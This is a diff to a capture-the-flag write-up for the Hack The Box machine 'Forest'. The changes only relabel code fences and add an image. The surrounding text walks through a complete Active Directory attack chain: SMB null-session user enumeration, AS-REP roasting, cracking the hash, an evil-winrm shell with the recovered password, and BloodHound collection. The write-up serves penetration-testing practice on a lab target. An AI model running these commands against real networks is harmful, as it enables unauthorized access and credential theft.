@@ -1,8 +1,10 @@
 ## ENUMERATION
+<img width="682" height="399" alt="image" src="https://github.com/user-attachments/assets/3f403783-14f7-43ac-9a89-e83654329c0f" />
+
 
 ### NMAP
 
-```jsx
+```bash
 PORT      STATE SERVICE      VERSION
 53/tcp    open  domain       Simple DNS Plus
 88/tcp    open  kerberos-sec Microsoft Windows Kerberos (server time: 2025-07-18 04:48:28Z)
@@ -64,7 +66,7 @@ Service detection performed. Please report any incorrect results at https://nmap
 
 CHECKING FOR NULL SESSION
 
-```jsx
+```bash
  nxc smb 10.10.10.161 -u '' -p ''                   
 SMB         10.10.10.161    445    FOREST           [*] Windows 10 / Server 2016 Build 14393 x64 (name:FOREST) (domain:htb.local) (signing:True) (SMBv1:True)
 SMB         10.10.10.161    445    FOREST           [+] htb.local\:
@@ -72,7 +74,7 @@ SMB         10.10.10.161    445    FOREST           [+] htb.local\:
 
 ENUMERATING SHARES WITH NULL SESSIONS
 
-```jsx
+```bash
 nxc smb 10.10.10.161 -u '' -p '' --shares 
 SMB         10.10.10.161    445    FOREST           [*] Windows 10 / Server 2016 Build 14393 x64 (name:FOREST) (domain:htb.local) (signing:True) (SMBv1:True)
 SMB         10.10.10.161    445    FOREST           [+] htb.local\: 
@@ -83,7 +85,7 @@ We can’t enumerate the shares lets try to enumerate users with —users or bru
 
 ### USER ENUMERATION
 
-```jsx
+```bash
 nxc smb 10.10.10.161 -u '' -p '' --users  
 SMB         10.10.10.161    445    FOREST           [*] Windows 10 / Server 2016 Build 14393 x64 (name:FOREST) (domain:htb.local) (signing:True) (SMBv1:True)
 SMB         10.10.10.161    445    FOREST           [+] htb.local\: 
@@ -107,7 +109,7 @@ SMB         10.10.10.161    445    FOREST           SM_1ffab36a2f5f479cb
 
 Here we see we have a bunch of users we can get the users and save it in a file using 
 
-```jsx
+```bash
 nxc smb 10.10.10.161 -u '' -p '' --users-export users
 ```
 
@@ -117,7 +119,7 @@ nxc smb 10.10.10.161 -u '' -p '' --users-export users
 
 Since we a have bunch of users we can try for asreproast to get krbtgt hashes if any user have pre auth enabled
 
-```jsx
+```bash
 nxc ldap 10.10.10.161 -u users -p '' --asreproast output.txt
 LDAP        10.10.10.161    389    FOREST           [*] Windows 10 / Server 2016 Build 14393 (name:FOREST) (domain:htb.local)
 [-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
@@ -140,7 +142,7 @@ Here we got a hash for the user svc-alfresco
 
 ### CRACKING HASH
 
-```jsx
+```bash
 hashcat hash /home/panda/Downloads/rockyou.txt  --show 
 Hash-mode was not specified with -m. Attempting to auto-detect hash mode.
 The following mode was auto-detected as the only one matching your input hash:
@@ -155,7 +157,7 @@ $krb5asrep$23$svc-alfresco@HTB.LOCAL:a47dc50fbda7628a6980e6b336723f22$711e9b4ab3
 
 ### SHELL AS SVC-ALFRESCO
 
-```jsx
+```bash
 evil-winrm -i 10.10.10.161 -u 'svc-alfresco' -p s3rvice 
                                         
 Evil-WinRM shell v3.7
@@ -186,7 +188,7 @@ C:.
 
 Collecting data for bloodhound and uploading to bloodhound.
 
-```jsx
+```bash
 mkdir bloodhound; cd bloodhound; bloodhound-python -u 'svc-alfresco' -p 's3rvice' -ns 10.10.10.161 -d htb.local  -c all
 INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
 INFO: Found AD domain: htb.local
